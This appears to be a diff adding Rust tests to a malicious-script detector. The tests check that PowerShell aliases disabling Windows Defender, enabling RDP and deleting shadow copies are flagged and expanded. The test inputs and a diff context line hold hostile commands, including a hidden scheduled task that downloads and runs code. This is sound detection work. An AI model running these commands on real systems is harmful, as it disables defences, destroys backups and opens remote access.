@@ -3311,6 +3311,22 @@ schtasks /create /tn "Updater" /tr "powershell -w hidden \"IEX(New-Object Net.We
     }
 
     #[test]
+    fn powershell_ssv_alias_disabled_emits_defender_evasion_trait() {
+        let script = br#"powershell -Command "ssv WinDefend -StartupType Disabled""#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::DefenderEvasion { action, target }
+                    if action == "powershell-service-disabled" && target == "WinDefend"
+            )),
+            "PowerShell ssv disabled WinDefend was not surfaced: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn powershell_set_service_reordered_disabled_args_emit_defender_evasion_trait() {
         let script = br#"powershell -Command "Set-Service -StartupType Disabled -Name WinDefend""#;
         let report = analyze(script, &AnalyzeConfig::default());
@@ -4730,6 +4746,22 @@ reg add "HKLM\system\CurrentControlSet\Control\Terminal Server\WinStations\RDP-T
                     if technique == "rdp-service-enable" && target == "TermService"
             )),
             "PowerShell Set-Service TermService auto was not surfaced: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn powershell_ssv_termservice_auto_emits_remote_access_trait() {
+        let script = br#"powershell -Command "ssv -Name TermService -StartupType Automatic""#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::RemoteAccess { technique, target, .. }
+                    if technique == "rdp-service-enable" && target == "TermService"
+            )),
+            "PowerShell ssv TermService auto was not surfaced: {:?}",
             report.traits
         );
     }
@@ -40598,7 +40630,7 @@ mod ps_alias_tests {
     #[test]
     fn wmi_and_service_aliases_expanded() {
         let out = expand_aliases(
-            "gwmi Win32_ShadowCopy | rwmi; gcim AntiVirusProduct; gsv WinDefend; sasv TermService",
+            "gwmi Win32_ShadowCopy | rwmi; gcim AntiVirusProduct; gsv WinDefend; sasv TermService; ssv WinDefend",
         );
         assert!(
             out.contains("Get-WmiObject Win32_ShadowCopy"),
@@ -40613,13 +40645,15 @@ mod ps_alias_tests {
         );
         assert!(out.contains("Get-Service WinDefend"), "got: {}", out);
         assert!(out.contains("Start-Service TermService"), "got: {}", out);
+        assert!(out.contains("Set-Service WinDefend"), "got: {}", out);
     }
 
     #[test]
     fn gate_allows_wmi_and_service_alias_only_payload() {
         use crate::ps_alias::expand_aliases_if_ps;
-        let out =
-            expand_aliases_if_ps("gwmi Win32_ShadowCopy | rwmi; gsv WinDefend; sasv TermService");
+        let out = expand_aliases_if_ps(
+            "gwmi Win32_ShadowCopy | rwmi; gsv WinDefend; sasv TermService; ssv WinDefend",
+        );
         assert!(
             out.contains("Get-WmiObject Win32_ShadowCopy"),
             "got: {}",
@@ -40628,6 +40662,7 @@ mod ps_alias_tests {
         assert!(out.contains("Remove-WmiObject"), "got: {}", out);
         assert!(out.contains("Get-Service WinDefend"), "got: {}", out);
         assert!(out.contains("Start-Service TermService"), "got: {}", out);
+        assert!(out.contains("Set-Service WinDefend"), "got: {}", out);
     }
 
     #[test]
